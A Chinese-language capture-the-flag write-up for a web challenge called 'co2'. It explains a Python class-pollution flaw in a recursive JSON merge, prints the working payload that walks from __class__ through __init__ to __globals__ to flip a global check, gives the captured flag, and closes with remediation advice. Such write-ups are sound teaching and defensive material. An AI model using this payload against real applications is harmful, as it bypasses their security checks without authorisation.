# co2

## 题目简述

应用允许已登录用户向 `/save_feedback` 提交 JSON。其递归 `merge` 函数会沿对象属性继续写入，且没有禁止 Python 的双下划线属性。这样可从一个临时 `Feedback` 对象走到其类、构造函数和模块全局变量，修改 `/get_flag` 使用的 `flag` 变量。

flag 端点仅在全局变量 `flag == "true"` 时返回环境变量中的 flag；所以决定性漏洞是 Python 类污染（class pollution），归入 Web。

## 解题过程

先注册并登录任意普通用户，因为两个接口都带有 `login_required`。提交以下 JSON 到 `/save_feedback`：

```json
{
  "title": "",
  "content": "",
  "rating": "",
  "referred": "",
  "__class__": {
    "__init__": {
      "__globals__": {
        "flag": "true"
      }
    }
  }
}
```

`merge` 遇到已有属性时会递归处理字典值，因此路径为 `Feedback 实例 → __class__ → __init__ → __globals__`。最后一次赋值把路由模块中的 `flag` 改成字符串 `"true"`，并非修改数据库或当前用户角色。

随后在同一登录会话请求 `/get_flag`。条件成立后端点回显 flag：

```text
DUCTF{_cl455_p0lluti0n_ftw_}
```

## 方法总结

递归合并外部 JSON 时应只复制明确允许的字段；不要对对象执行任意 `setattr`，更不能允许 `__class__`、`__init__`、`__globals__` 等元编程属性进入合并逻辑。测试此类接口时，要同时检查“写入污染”与“被污染全局量影响的安全判断”能否闭合为完整利用链。
